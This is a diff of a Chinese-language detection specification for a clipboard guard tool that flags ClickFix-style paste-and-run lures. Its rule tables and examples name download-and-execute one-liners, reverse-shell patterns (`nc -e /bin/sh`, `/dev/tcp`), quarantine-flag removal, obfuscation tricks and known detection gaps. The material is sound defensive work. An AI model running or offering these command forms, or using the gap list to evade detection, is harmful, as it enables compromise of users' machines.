@@ -1,6 +1,6 @@
 # PasteWarden 判斷準則（原 ClipGuard）
 
-> **Phase 0 註記**：本文件描述的是舊版（C#）的行為，也是 Rust 版的驗收規格；文中的 `src/ClipGuard.Core/*.cs`、`extension/` 路徑指向 git 歷史中的舊程式（Phase 0 刪除前的 commit）。Phase 1 會把程式位置全部改成 Rust 模組。行為的機器可驗證版本在 `corpus/`。
+> **說明**：本文件是 PasteWarden 偵測行為的規格。程式位置指向 Rust 模組（`crates/core/src/`）；行為的機器可驗證版本在 `corpus/`（`cargo run -p xtask -- corpus run`）。標成「舊版」的 Windows App、瀏覽器插件元件在 git 歷史中（Phase 0 刪除前的 commit），會在 Phase 3、4 重做。
 
 這份文件是 ClipGuard **偵測行為的規格**：什麼情況要攔截、提醒或放行，以及背後的理由。
 
@@ -51,11 +51,11 @@
 
 錢包掉包現在也會抓句子裡的地址（§6.2），所以可能和其他通知碰在同一次複製。它排在「指令被攔截」之後：攔截通知帶有「點擊還原」，而且剪貼簿已經清空，假地址也一起清掉了。它排在其他提醒之前：掉包代表電腦上很可能有正在執行的惡意程式，比「這段文字含機密或隱藏字元」更急。被蓋掉的只是通知，剪貼簿狀態（入口守衛用的 Suspicious）照常設定。
 
-程式位置：`src/ClipGuard.App/TrayApp.cs`（`OnClipboardChanged`）、`src/ClipGuard.Core/ClipboardGuardState.cs`。
+程式位置：`TrayApp`（舊版 Windows App；Phase 4 由 `crates/platform` 與桌面 App 重做）（`OnClipboardChanged`）、`crates/core/src/policy/guard.rs`。
 
 ### 2.1 通知節流（#24 F18）
 
-程式：`src/ClipGuard.Core/NotificationThrottle.cs`（決策，時間可注入）；`TrayApp.cs` 只負責顯示和計時。
+程式：`crates/core/src/policy/throttle.rs`（決策，時間可注入）；`TrayApp`（舊版 Windows App；Phase 4 由 `crates/platform` 與桌面 App 重做） 只負責顯示和計時。
 
 Windows 會把通知排隊依序顯示，連續複製時，幾十秒後跳出的都是早就過期的通知。所以所有通知（包括執行入口守衛和貼上攔截的錯誤通知）都先經過節流：
 
@@ -84,7 +84,7 @@ Windows 會把通知排隊依序顯示，連續複製時，幾十秒後跳出的
 
 ## 3. 指令偵測（ClickFix / FileFix）
 
-程式：`src/ClipGuard.Core/CommandDetector.cs`、`CommandNormalizer.cs`。
+程式：`crates/core/src/command/`（`verdict.rs` 判定、`signals.rs` 訊號、`download_exec.rs` 下載後直接執行、`normalize.rs` 正規化、`deobfuscate/` 解混淆、`markdown.rs`、`finding.rs` 情境與 `risk_score`、`explain.rs` 白話說明）；資料在 `rules/command/`。舊版是 `crates/core/src/command/verdict.rs`、`crates/core/src/command/normalize.rs`。
 
 ### 3.0 比對前的處理（#19）
 
@@ -95,9 +95,9 @@ Windows 會把通知排隊依序顯示，連續複製時，幾十秒後跳出的
 | ≤ 4096 字 | 整段一起分析（訊號可以分散在不同行） |
 | > 4096 字 | 先把同一行內超過 64 個的連續空白縮成 64 個空格（仍滿足「30 個以上空白接 `#`」），縮完 ≤ 4096 字就整段分析。否則分段分析，取最高等級：開頭 4096 字（涵蓋第一行和 Win+R 的 259 字上限），加上之後的每一行；比 4096 字長的行切成每次前進 2048 字的重疊片段，2048 字以內的指令不管在行內哪裡都會完整落在某一段。總共最多分析 256 KB、4000 行，超過的部分不分析，避免卡住 UI |
 
-含 `.*` 的規則（LOLBin、誘餌註解）用 `RegexOptions.NonBacktracking`，同一個字重複很多次時不會變成 O(n²)。
+所有規則都用 Rust 的 `regex` crate（保證線性時間；舊版含 `.*` 的規則用 `RegexOptions.NonBacktracking`），同一個字重複很多次時不會變成 O(n²)。1b 起每一段也會跑一次解混淆（§3.5），判定取兩者較高的等級。
 
-**正規化**（`CommandNormalizer`，純函式）：規則比對的是正規化後的文字；原文另外保留給隔離區還原，不寫檔、不記 log。白話說明（§3.3）也用同一份正規化結果，只看前 4096 字。依序處理：
+**正規化**（`normalize.rs`，舊版 `CommandNormalizer`，純函式）：規則比對的是正規化後的文字；原文另外保留給隔離區還原，不寫檔、不記 log。白話說明（§3.3）也用同一份正規化結果，只看前 4096 字。依序處理：
 
 | 步驟 | 例子 |
 |---|---|
@@ -105,7 +105,7 @@ Windows 會把通知排隊依序顯示，連續複製時，幾十秒後跳出的
 | dash 變體換成 `-`：U+2010–2015、U+2212、U+FE58、U+FE63、全形 U+FF0D | `–w hidden` → `-w hidden` |
 | 去掉 cmd 的 `^` 跳脫；`^^` 變 `^`；行尾的 `^` 接下一行 | `m^s^h^t^a` → `mshta` |
 | 代入 `set x=…`、`set "x=…"` 設定的 `%x%`，以及延遲展開（`cmd /v:on`）的 `!x!`（只代入一層；最多 16 個變數、64 次代入、值最長 1024 字）。沒設定過的 `!x!` 不動，句子裡的驚嘆號不受影響（#21） | `set x=…&& call %x%`、`call !a!!b!` |
-| 展開固定的系統環境變數：`%SystemRoot%`、`%windir%`、`%SystemDrive%`、`%ComSpec%`、`%ProgramFiles%` 等，以及 PowerShell 的 `$env:windir` 寫法。不讀本機的真實環境變數 | `%ComSpec% /c` → `cmd /c` |
+| 展開固定的系統環境變數：`%SystemRoot%`、`%windir%`、`%SystemDrive%`、`%ComSpec%`、`%ProgramFiles%` 等，以及 PowerShell 的 `$env:windir` 寫法；1b 加上 ClickFix 常拿來切子字串的 `%PUBLIC%`、`%ALLUSERSPROFILE%`、`%ProgramData%`、`%OS%`、`%PATHEXT%`（清單在 `rules/command/programs.json`）。不讀本機的真實環境變數 | `%ComSpec% /c` → `cmd /c` |
 | 合併字中間的引號 | `"m"sh"ta"`、`ms""hta` → `mshta` |
 | 已知程式（powershell、pwsh、mshta、cmd、certutil、bitsadmin、rundll32、regsvr32、msiexec、conhost、curl、wget，以及 #21 的 wscript、cscript、hh、cmstp、pcalua、odbcconf、installutil、ftp、explorer、net、net1）的完整路徑只留檔名，有沒有引號、`.exe` 都可以 | `"C:\…\System32\mshta.exe"` → `mshta` |
 
@@ -131,18 +131,31 @@ Windows 會把通知排隊依序顯示，連續複製時，幾十秒後跳出的
 | Protocol handler（#21） | `search-ms:` / `search:` 帶 `query=`、`crumb=`、`displayname=` 等參數；`ms-msdt:` 後面接 `/x` 或 `-x` 參數 |
 | 下載後交給 shell | curl/wget 的輸出 pipe 給 sh、bash 或 zsh |
 | 下載後直接執行（#20） | 見下方說明。本身就是執行訊號：不寫程式名稱、貼進 PowerShell 視窗的寫法也算 |
+| osascript（1b，macOS） | `osascript -e …`（可先接 `-l JavaScript`），或下載結果 pipe 給 `osascript` |
+| 拿掉隔離標記（1b，macOS） | `xattr -d com.apple.quarantine …`、`xattr -c` / `-cr`（跳過 Gatekeeper 檢查）。`spctl --master-disable` 單獨出現是系統管理指令，不算（良性語料 `benign.cmd.234`） |
+| 解碼後交給 shell（1b） | `base64 -d` / `-D`（macOS）/ `--decode`、`xxd -r`、`openssl base64 -d` 的輸出 pipe 給 sh、bash、zsh、python、perl、osascript；或 `sh -c "$(… base64 -d)"`、`eval "$(… base64 -d)"` |
+| shell 網路連線（1b） | `/dev/tcp/主機/埠`、`/dev/udp/…`、`nc -e /bin/sh`、`mkfifo … \| nc`。只有 `/dev/tcp` 的埠號檢查（`echo > /dev/tcp/主機/22`）只提醒 |
+
+macOS／Linux 訊號的強弱（1b，P1）：會叫起程式或交出控制權的寫法算執行訊號；只有「明顯是攻擊才會用」的寫法才算強詐騙訊號（下表）。`xattr`、`osascript -e`、`/dev/tcp` 單獨出現都有正當用途（打開沒簽章的 App、寫自動化腳本、檢查埠號），所以只提醒；搭配下載後直接執行等強訊號才攔截。
 
 「像在下指令」這個條件是為了排除一般句子（例如 `I use powershell every day`，#8）和網址路徑（`github.com/powershell/...`）。#21 的程式也一樣：只提到程式名稱的句子（`wscript and cscript are …`）、句子中間的 UNC 路徑（`檔案放在 \\fileserver\share\setup.exe`）都不算；單獨一行的 UNC 執行檔算，因為貼進 Win+R 就會執行（同 §3.0）。
 
-**下載後直接執行**（`DownloadExecution.cs`）指的是下面任何一種寫法，只看正規化後的文字：
+**下載後直接執行**（`download_exec.rs`，舊版 `crates/core/src/command/download_exec.rs`）指的是下面任何一種寫法，只看正規化後的文字：
 
 | 寫法 | 例子（片段） |
 |---|---|
-| 下載結果 pipe 給 iex、Invoke-Expression、powershell、pwsh、cmd、sh / bash / zsh。下載指令後面至少要有一個參數，避免把表格 `\| curl \| cmd \|` 當成指令 | `irm … \| iex`、`curl … \| cmd`、`curl … \| powershell -` |
+| 下載結果 pipe 給 iex、Invoke-Expression、powershell、pwsh、cmd、sh / bash / zsh。下載指令後面至少要有一個參數，避免把表格 `\| curl \| cmd \|` 當成指令。1b：也可以先接 `sudo`（含參數）、`/bin/`、`/usr/bin/env` 這類路徑，以及 ksh、dash、osascript；python、perl、ruby、node 只有從標準輸入讀腳本時才算（後面沒有參數或只有 `-`），`\| python3 -m json.tool` 不算 | `irm … \| iex`、`curl … \| cmd`、`curl … \| powershell -`、`curl … \| sudo -E bash -`、`curl … \| python3` |
 | iex 直接包住下載 | `iex(iwr …)`、`iex ((New-Object Net.WebClient).DownloadString(…))`、`iex "& { $(irm …) }"` |
+| 1b：`.Invoke(…)` / `.InvokeScript(…)` 直接包住下載 | `$ExecutionContext.InvokeCommand.InvokeScript((irm …))` |
+| 1b：命令或程序替換（shell、python、perl、ruby、node 執行下載的內容） | `/bin/bash -c "$(curl …)"`、`eval "$(wget -qO- …)"`、`source <(curl …)`、`bash <(curl …)` |
 | 先存進變數，再 iex 那個變數 | `$c = iwr …` 加上 `iex $c` |
-| `[ScriptBlock]::Create` 搭配任何下載 | `&([scriptblock]::Create((irm …)))` |
-| 下載成檔案（`-OutFile`、`DownloadFile`、`curl -o`、`certutil -urlcache`、`bitsadmin /transfer`、`Start-BitsTransfer`）再啟動（`Start-Process`、`start`、`&`、在下指令的位置直接寫 `.exe` / `.bat` / `.msi`…） | `iwr … -OutFile a.exe; Start-Process a.exe` |
+| `[ScriptBlock]::Create`（1b 加上 `InvokeCommand.NewScriptBlock` / `InvokeScript`）搭配任何下載 | `&([scriptblock]::Create((irm …)))` |
+| 下載成檔案（`-OutFile`、`DownloadFile`、`curl -o`、`certutil -urlcache`、`bitsadmin /transfer`、`Start-BitsTransfer`）再啟動（`Start-Process`、`start`、`&`、在下指令的位置直接寫 `.exe` / `.bat` / `.msi`…；1b 加上 `rundll32` / `regsvr32` 載入檔案、`Invoke-Command -FilePath`） | `iwr … -OutFile a.exe; Start-Process a.exe`、`iwr … -OutFile $env:TEMP\a.dll; rundll32 $env:TEMP\a.dll,Start` |
+| 1b：curl / wget 存成檔案（`-o 檔名`、`-O`、`--output`、`> 檔名`；curl `-O` 和沒寫 `-O` 的 wget 用網址最後一段當檔名），之後在下指令的位置執行**同一個檔名**：直接執行（`./x`、`/tmp/x`）、交給 sh / bash / python 等、`source`、`open` | `curl -o /tmp/u … && chmod +x /tmp/u && /tmp/u`、`wget …/i.sh; sh i.sh` |
+| 1b：直譯器單行程式（`python -c`、`perl -e`、`ruby -e`、`node -e`、`php -r`）在同一行裡既下載（urlopen、requests.get、LWP、`get("https://…")`、fetch…）又執行（`exec(`、`eval`、`os.system`、subprocess…） | `python3 -c "…exec(u.urlopen('…').read())"`、`perl -e 'use LWP::Simple; eval get(…)'` |
+
+- 存檔後執行要比對檔名，所以 `curl -LO …app.tar.gz && tar xzf app.tar.gz`、`curl -o data.json … && cat data.json` 不算。
+- 單行程式只下載不執行（`print(urlopen(…).status)`）、只執行不下載（`python -c 'print(1)'`）都不算。
 
 **詐騙訊號**：
 
@@ -155,6 +168,12 @@ Windows 會把通知排隊依序顯示，連續複製時，幾十秒後跳出的
 | 勾選符號 ✅ ✔ ☑ | 強 |
 | 30 個以上空白後接 `#`（把真正的指令擠出輸入框） | 強 |
 | mshta 直接接遠端 URL | 強 |
+| 1b：.NET 的隱藏視窗寫法：`[Diagnostics.ProcessWindowStyle]::Hidden`、`.WindowStyle = 'Hidden'`、`CreateNoWindow = $true`（理由同隱藏視窗）。`Start-Process … -WindowStyle Hidden` 原本就由上面的 `-WindowStyle` 規則涵蓋 | 強 |
+| 1b：解碼後交給 shell（`base64 -d \| sh` 等，見執行訊號），理由同 `-enc` | 強 |
+| 1b：反向 shell：`sh -i` 接到 `/dev/tcp`、`/dev/tcp/…` 加上 `0>&1` 這類重導、`exec 5<>/dev/tcp/…`、`nc -e /bin/sh`、`mkfifo … \| nc` | 強 |
+| 1b：在背景脫離執行而且不顯示輸出（Unix 版的隱藏視窗）：`nohup`、`disown`、`setsid`、`>/dev/null 2>&1 &`、`&>/dev/null &`。`nohup python app.py > app.log 2>&1 &` 這類沒有執行訊號的不受影響 | 強 |
+| 1b：msiexec 靜默安裝遠端套件：URL 加 `/q`、`/qn`、`/quiet`、`/passive`（`-` 開頭也算）。不靜默時安裝畫面還看得到發行者，只提醒 | 強 |
+| 1b：解混淆後才出現的執行訊號（`cmd-reason-obfuscated`，§3.5） | 強 |
 | 從網路下載（iwr、irm、DownloadString、WebClient…） | **弱** |
 | 把內容當程式碼執行（iex / Invoke-Expression） | **弱** |
 
@@ -196,15 +215,29 @@ Windows 會把通知排隊依序顯示，連續複製時，幾十秒後跳出的
 | ollama.com | Ollama |
 | dot.net | dotnet-install |
 | aka.ms | 微軟官方短網址（例如 install-powershell） |
+| get.docker.com | Docker 便利安裝腳本（1b：先存檔再 `sudo sh get-docker.sh` 現在也算下載後直接執行） |
 
-- **收錄條件**：官方文件要使用者貼上「下載後執行」的指令，而且網域由專案本身控制。raw.githubusercontent.com 這類任何人都能放檔案的網站不收，所以 Homebrew、nvm 的安裝指令會被攔截（可以點通知還原）。
+**官方安裝網址路徑**（1b，phase-1.md §1.8，`rules/command/official-paths.json`）：raw.githubusercontent.com 這類共用主機不能整個收，只收特定專案的路徑前綴。
+
+| 前綴 | 用途 |
+|---|---|
+| `raw.githubusercontent.com/Homebrew/install/` | Homebrew |
+| `raw.githubusercontent.com/nvm-sh/nvm/` | nvm |
+| `raw.githubusercontent.com/ohmyzsh/ohmyzsh/` | Oh My Zsh |
+
+- 網址必須是 `https`；主機必須**等於**前綴的主機（不含子網域）；路徑的每一段只能是 `[A-Za-z0-9._~-]`、不能是 `.` 或 `..`（`%2e`、`//`、反斜線、帳號欄位都不算）；前綴的每一段不分大小寫逐段相等（GitHub 的帳號、repo 不分大小寫），而且前綴後面至少還有一段（檔案）。`Homebrew/install-tools/`、`Homebrew-x/install/` 都不算。
+- 其他規則跟主機清單完全一樣：拼出來的網址不套用、其他強訊號照樣判 Malicious、相關的每一行的每一個來源都要在主機清單或路徑清單裡。
+- 良性語料 `benign.cmd.410`–`413`（Homebrew、nvm、oh-my-zsh，標了 `spec-escalates`）因此從 Malicious 降為 Suspicious。
+
+- **收錄條件**：官方文件要使用者貼上「下載後執行」的指令，而且網域由專案本身控制。raw.githubusercontent.com 這類任何人都能放檔案的網站不收整個主機，只收上表的路徑前綴（1b 之前 Homebrew、nvm 的安裝指令會被攔截）。
 - **比對主機名稱，不是子字串**：主機必須等於清單裡的網站，或是它的子網域。`astral.sh.example.invalid`、`notastral.sh` 都不算；網址裡的帳號欄位（`https://astral.sh@主機/`）以真正的主機為準；主機在反斜線處截斷；不是純 ASCII 的主機一律不算。
 - **看哪些行**：下載、執行（iex、ScriptBlock）、設定變數（`$u = …`、`set u=…`）的那幾行裡，每一個主機都要在清單裡；找不到任何主機（例如 `irm $u | iex` 而 `$u` 不在文字裡）就不算。其他行（例如 README 附的 GitHub 連結）不看，官方指令連同說明一起複製時不會被升級。
-- **拼出來的網址不可信**：文字裡有字串串接（`'…'+'…'`）、`-join`、`-f`、`-replace`、`[char]`、反引號、`FromBase64String` 時，不套用清單。
+- **拼出來的網址不可信**：文字裡有字串串接（`'…'+'…'`）、`-join`、`-f`、`-replace` / `-creplace`、`[char]`、`[char[]]`、`FromBase64String` 時，不套用清單；1b 加上 `[string]::…`、`.Insert()` / `.Substring()` / `.Remove()` / `.Replace()` 等字串方法、cmd 子字串（`%x:~…`、`!x:~…`）、`\x` 跳脫、連續三個以上的 `%xx`、`base64 -d`、`xxd -r`、`b64decode`，以及經過 §3.5 任何「拼字串」步驟的文字。
+- **反引號只算 PowerShell 跳脫**（1b，phase-1.md 1b 待辦）：markdown 的 code fence 行（```` ```sh ````、`~~~`，後面最多一個語言名稱）和行內 code（`` `bun upgrade` ``：前面不是英數字、同一行裡有同樣長度的結尾、結尾後面不是英數字）的反引號不算「拼出來的網址」。其他反引號（`` p`ow`er ``、網址裡的 `` `. ``、行尾接續）照樣算。為了不讓行內 code 的形狀被拿來藏網址，主機會用「保留反引號」和「拿掉 markdown 標記」兩種讀法各取一次，兩種讀法的每一個來源都要在清單裡：`` `irm https://astral.sh`.example.invalid/x | iex `` 拿掉標記後的主機是 `astral.sh.example.invalid`，判 Malicious。良性語料 `benign.cmd.416`、`417`、`421` 因此降為 Suspicious。
 - **清單只拿掉「下載後直接執行」這一個強訊號**：官方網站的指令如果還有隱藏視窗、誘餌註解等強訊號，一樣判 Malicious。
 - 「從網路下載」「iex」單獨出現仍只算弱訊號。scoop 不寫程式名稱的寫法（只有下載＋iex）現在跟 uv、bun 一樣判 Suspicious（F17：原本完全不提醒）。
 
-### 3.3 白話說明（`CommandExplainer.cs`）
+### 3.3 白話說明（`explain.rs`，舊版 `crates/core/src/command/explain.rs`）
 - 指令被判為 Suspicious 或 Malicious 時，會產生一段白話說明，例如「從 example.invalid 下載並執行」「隱藏視窗」「藏了一段編碼過的指令」。說明跟著介面語言（zh-TW 或英文，#27），文字在 `src/ClipGuard.Core/Resources/CoreStrings*.resx` 的 `Explain_*`；本文件引用的是 zh-TW 版本。
 - #21 的訊號跟偵測共用同一組樣式，各有一句說明，例如「用 wscript／cscript 執行腳本檔」「執行 example.invalid 網路分享上的檔案」「連到 example.invalid 的 WebDAV 遠端資料夾」「用 ms-msdt: 呼叫疑難排解工具（Follina 漏洞的手法）」。
 - 下載來源的主機用跟官方網站清單一樣的方式取出（帳號欄位以真正的主機為準），最多列 3 個。
@@ -212,21 +245,80 @@ Windows 會把通知排隊依序顯示，連續複製時，幾十秒後跳出的
 - 通知內容最多 255 字元，標題最多 63 字元，超過的部分以 `…` 截斷。英文比中文長，攔截通知的開頭和結尾句加起來仍要留至少 60 字給白話說明，`LocalizationTests` 會對兩種語言檢查這個空間和標題長度。
 
 ### 3.4 已知缺口（尚未修正）
+
+1b 已修掉的（有語料 `corpus/cases/command-1b-*.jsonl`）：cmd 子字串（`%x:~0,3%`、`!x:~0,3!`）與取代（`%x:a=b%`）、多層變數代入、PowerShell 變數或字串串接組出程式名稱（`& ('ms'+'hta')`）、反引號跳脫、全形英文字母（§3.5）；Homebrew、nvm、oh-my-zsh 的官方安裝指令（§3.2 路徑清單）；`[string]::Concat`、`.Insert()` 組出的網址（§3.2 拼字串清單）；msiexec 靜默安裝遠端套件、`.Invoke()`、`InvokeScript`、`Invoke-Command -FilePath`、`rundll32` 載入剛下載的 DLL（§3.1）。
+
 | 缺口 | Issue |
 |---|---|
-| 超過 4096 字時，訊號分散在不同行而且不在開頭 4096 字內（例如第 1 行的指令配上第 200 行的誘餌註解）時，各行分開看，可能只判 Suspicious；同一行裡用超過 2048 個非空白字元把執行訊號和詐騙訊號隔開時也一樣；超過 256 KB / 4000 行的部分不分析 | #19 的取捨 |
+| 超過 4096 字時，訊號分散在不同行而且不在開頭 4096 字內（例如第 1 行的指令配上第 200 行的誘餌註解）時，各行分開看，可能只判 Suspicious；同一行裡用超過 2048 個非空白字元把執行訊號和詐騙訊號隔開時也一樣；超過 256 KB / 4000 行的部分不分析。解混淆也是一段一段做，跨段的變數設定和使用不會接起來 | #19 的取捨 |
 | 剪貼簿超過 1 Mi 字的部分根本不讀（§2.2），所以先塞超過 1 Mi 字的空白再接指令也看不到（縮空白是在讀進來之後才做） | #24 的取捨 |
-| cmd 子字串展開（`%x:~0,3%`、`!x:~0,3!`）、`set /p`、多層變數代入、`for` 迴圈組字、PowerShell 的變數或字串串接組出程式名稱（`& ('ms'+'hta')`）、反引號跳脫、全形英文字母 | 尚未開 issue |
-| 官方網站清單以外的合法安裝指令（Homebrew、nvm 等放在 raw.githubusercontent.com 的）會被攔截，要點通知還原 | #20 的取捨（F17） |
-| 官方網站清單只認得常見的字串拼接寫法；用 `[string]::Concat`、`.Insert()`、環境變數等其他方式組出清單外的網址，而且同一行放清單內網址當幌子時，可能只判 Suspicious | #20 的取捨 |
-| 「下載後直接執行」沒涵蓋的寫法：msiexec 直接裝遠端套件、`Invoke-Command`、`.Invoke()`、下載後用相對路徑以外的方式啟動（例如 `rundll32` 載入剛下載的 DLL）仍只提醒 | 尚未開 issue |
+| 解混淆只算「字面值」：`set /p`（從輸入讀值）、`for` 迴圈組字、執行時才知道的值（`$env:` 不在固定清單裡的變數、指令輸出）、算式（`[char](100+5)`）、`-split`、陣列反轉索引（`'atl'[-1..-3]`）、`.Substring()`、`Set-Alias`／`gcm i*x` 這類萬用字元找指令、壓縮過的內容（`GzipStream`、`DeflateStream`）都解不開。這些寫法大多仍會被 §3.2 的拼字串清單擋下官方清單，但組出來的程式名稱看不到，可能只判 Suspicious 或 None | 1b 的取捨（只做線性時間、不執行的字面分析） |
+| 解混淆最多 5 層、文字最多膨脹 4 倍、總長最多 1 Mi 字（§3.5）；第 6 層以後的 `-enc` 不再解開（外層的 `-enc` 本身已經是強訊號） | 1b 的取捨 |
+| markdown 的判斷是簡化版：fence 行只認「三個以上反引號或 `~` 加最多一個語言名稱」，行內 code 只認一兩個反引號的同長度配對。不完全照 CommonMark，例如縮排 4 格的 code block 不特別處理 | 1b 的取捨 |
+| 官方清單（主機或路徑）的指令如果另外用拼字串、編碼等手法寫，一律不套用清單（判 Malicious，可以點通知還原） | #20 的取捨 |
+| msiexec 沒有靜默參數時只提醒（安裝畫面看得到發行者）；用 `Start-Job`、排程工作（`schtasks`、`Register-ScheduledTask`）、WMI 啟動剛下載的檔案沒有涵蓋 | 1b 的取捨 |
+| `xattr` 拿掉隔離標記、`osascript -e`、`/dev/tcp` 埠號檢查單獨出現只提醒；`spctl --master-disable` 不算訊號；下載到 `/tmp` 再用不同檔名執行（例如先 `mv`）不算「存檔後執行」 | 1b 的取捨（P1） |
+| 直譯器單行程式的下載和執行要在同一行；分成多行的 Python 腳本不分析 | 1b 的取捨 |
+| 白話說明（§3.3）還是只描述正規化後的文字和 `-enc` 解碼結果，其他解混淆步驟只出現在 trace（§3.5） | 尚未開 issue |
 | `setlocal enabledelayedexpansion`（批次檔裡的延遲展開）本身不算訊號；`!x!` 仍會代入 | #21 的取捨 |
 | 遠端檔案只在「下指令的位置」才算：`pushd \\主機\…` 之後用相對路徑執行、`net use` 的磁碟代號前面先寫其他開關（`net use /persistent:no Z: …`）沒有涵蓋 | #21 的取捨 |
 | #21 的 LOLBin、UNC/WebDAV、`search-ms:`、`ms-msdt:` 單獨出現只提醒（P1），要搭配強詐騙訊號才攔截 | #21 的取捨 |
 
-## 4. 執行入口守衛
+### 3.5 解混淆與洋蔥 trace（1b，`deobfuscate/`）
 
-程式：`src/ClipGuard.Core/ExecutionEntryGuard.cs`、`src/ClipGuard.App/ForegroundWatcher.cs`（`EVENT_SYSTEM_FOREGROUND`）。
+`command::deobfuscate(text)` 把文字一層一層剝開，每一步記成一個 `DeobfuscationStep`：種類（`kind`）、第幾層（`layer`）、說明（訊息 ID `cmd-deob-*`，參數 `count` = 改了幾處）、這一步之後的文字預覽。只做字面分析：不執行、不連網、不讀環境變數，全部用 `regex` crate。
+
+| 層 | 步驟（依序） |
+|---|---|
+| 0 | §3.0 的正規化（每一小步各自記錄：`invisible`、`dash`、`caret`、`variable`、`quote`、`program_path`），再拿掉 markdown 標記（`markdown`：fence 行整行拿掉、行內 code 拿掉前後的反引號，判斷方式同 §3.2） |
+| 1–5 | 全形英數字（`full_width`，只換字母和數字，全形標點不動）→ PowerShell 反引號跳脫（`backtick`，行尾的反引號接下一行）→ `%xx` 網址編碼（`url_decode`，連續三個以上、解出來是 UTF-8 文字）→ `\xHH` 跳脫和 16 位以上的十六進位字串（`hex_decode`，解出來要是可列印 ASCII）→ `-EncodedCommand`（`encoded_command`，UTF-16LE，判斷同 §3.3）→ Base64（`base64`：`[Text.Encoding]::UTF8/Unicode/….GetString([Convert]::FromBase64String('…'))`、`echo … \| base64 -d`、`base64 -d <<< …`、Python `b64decode('…')`）→ `[char]NN`、`[char[]](…)`（`char_code`）→ PowerShell 字串變數 `$a = '…'`（`ps_variable`；同一個變數被設成不同值就不代入）→ cmd 子字串與取代（`cmd_substring`：`%x:~a,b%`、`!x:~a,b!`、`%x:舊=新%`、`%x:*舊=新%`，用 `set` 的值或固定系統變數）→ `[string]::Concat/Join/Format`（`string_method`）→ `'a'+'b'`（`concat`）→ `-join`（`join`）→ `-f`（`format`）→ `-replace` / `-creplace` / `.Replace()`（`replace`）→ 拆開被當成指令的字串（`unwrap`：`('x')` → `'x'`，`& 'mshta'` → `& mshta`，`iex 'iwr …'` → `iex iwr …`）→ 再跑一次正規化（這時的變數代入記成 `nested_variable`） |
+
+- 字面值指 `'…'`（`''` 跳脫）或不含 `$`、反引號的 `"…"`；任何一邊是變數或執行時的值就不算，原文保留。
+- 一層沒有任何改變就停。上限都是具名常數：最多 `MAX_LAYERS` = 5 層；每一步的結果不能超過輸入的 `MAX_GROWTH` = 4 倍，也不能超過 `MAX_OUTPUT_CHARS` = 1 Mi 字，超過的那一步丟掉並停止（`capped`）；`+` 串接每層最多 16 輪、清單最多 4096 項、`-replace` 每層最多 32 次、樣式最長 256 字（用 `regex` crate 編譯，有大小上限）；最多記 `MAX_STEPS` = 64 步。
+- **預覽**：從第一個改變的地方往前 24 字開始、最多 120 字，空白縮成一個空格，截斷處加 `…`；裡面的機密（§5 的規則，預設個資包）先遮罩。預覽是不可信的內容，UI 要跳脫後才顯示。
+- **拼字串步驟**：`backtick`、`url_decode`、`hex_decode`、`char_code`、`concat`、`join`、`format`、`replace`、`string_method`、`base64`、`encoded_command`、`cmd_substring`、`nested_variable`。**混淆步驟**：拼字串步驟加上 `full_width`。`ps_variable`、`unwrap` 和第 0 層都不算（`$u = 'https://astral.sh/…'; irm $u | iex` 仍套用官方清單）。
+
+**判定怎麼用解混淆結果**（`verdict.rs`）：每一段（§3.0）照舊判定一次，再把剝完的文字用同一張判定表判定一次，取較高的等級、合併理由。
+
+- 剝的過程有拼字串步驟時，第二次判定不套用官方清單（§3.2）。
+- 剝完才出現、原文和「第 0 層的結果」都沒有的執行訊號，代表有人刻意藏起要執行的程式，如果過程有混淆步驟，就加上強訊號 `cmd-reason-obfuscated`（「用混淆手法藏住要執行的東西」），判 Malicious。例如 `& ('ms'+'hta') x.hta`、`%ComSpec:~-7,3% /c …`、全形的 `ｐｏｗｅｒｓｈｅｌｌ -c …`。只有混淆、沒有任何執行訊號的文字（`'a'+'b'`）仍是 None。
+- 只拿掉 markdown 標記不會改變判定。
+- 效能：每一段的解混淆都有上限，1 Mi 字的病態輸入（每一種步驟各一個）在 release 版要在 150 ms 內（`verdict.rs` 的 `deobfuscation_inputs_meet_budget`，CI 超過兩倍才失敗）。
+
+### 3.6 情境加權與 `risk_score`（1b，`finding.rs`）
+
+`command::analyze_in(text, &Context)` 回傳 `CommandFinding { verdict, risk_score, trace, hosts }`。`verdict` 一定等於 `command::analyze(text)`：**情境只影響 `risk_score`，不改判定**，所以不會把 Malicious 降級（P1），也不會只因為來源是瀏覽器就清空剪貼簿。`trace` 是各段的解混淆步驟（最多 64 步，預覽已遮罩），`hosts` 是原文和解混淆結果裡的下載來源主機（最多 16 個，小寫）。
+
+`risk_score`（0–100，給 UI 排序、決定提醒頻率和報表用）的公式公開如下：
+
+```
+分數 = 基本分
+     + 6 × 強詐騙理由數（最多算 3 個）
+     + 3 × 弱詐騙理由數（最多算 3 個）
+     + 2 × (執行理由數 − 1)（最多算 3 個）
+     + 4 × 解混淆步驟裡不同的混淆種類數（最多算 3 個）
+     + 情境
+再限制在該等級的區間內
+```
+
+| 等級 | 基本分 | 區間 |
+|---|---|---|
+| None | 0 | 0–19 |
+| Suspicious | 30 | 20–59 |
+| Malicious | 70 | 60–100 |
+
+| 來源（`Context.source.kind`） | 情境 | 套用在 |
+|---|---|---|
+| 瀏覽器 | +10（ClickFix 頁面在瀏覽器裡） | Suspicious、Malicious |
+| 通訊軟體 | +5（誘餌也會用訊息傳） | Suspicious、Malicious |
+| 終端機、IDE | −15（使用者自己的工作，降低提醒頻率） | 只有 Suspicious |
+| 其他、未知 | 0 | — |
+
+- 區間保證分數和判定一致：Malicious 一定 ≥ 60，終端機來源的 Suspicious 最低 20（仍然是提醒），None 最高 19。
+- 例：`cmd /c dir` 未知來源 30、瀏覽器 40、通訊軟體 35、終端機 20；從瀏覽器複製的隱藏視窗＋下載執行約 100。
+- `Context.platform` 目前不影響分數（保留給之後「指令方言和平台不符」的判斷）。
+
+程式：`crates/core/src/policy/entry.rs`、`ForegroundWatcher`（舊版 Windows App；Phase 4 由 `crates/platform` 與桌面 App 重做）（`EVENT_SYSTEM_FOREGROUND`）。
 
 | 入口 | 判斷（Windows 11 zh-TW 實測） |
 |---|---|
@@ -246,13 +338,13 @@ Windows 會把通知排隊依序顯示，連續複製時，幾十秒後跳出的
 
 ## 5. 機密偵測
 
-程式：`src/ClipGuard.Core/SecretDetector.cs`、`SecretRules.cs`、`SecretTextNormalizer.cs`、`Checksums.cs`、`PiiFormats.cs`、`SecretMasker.cs`、`SecretPacks.cs`；規則檔 `rules/*.json`（§5.4）。個資分成通用包和國家包（#27，§5.6）。
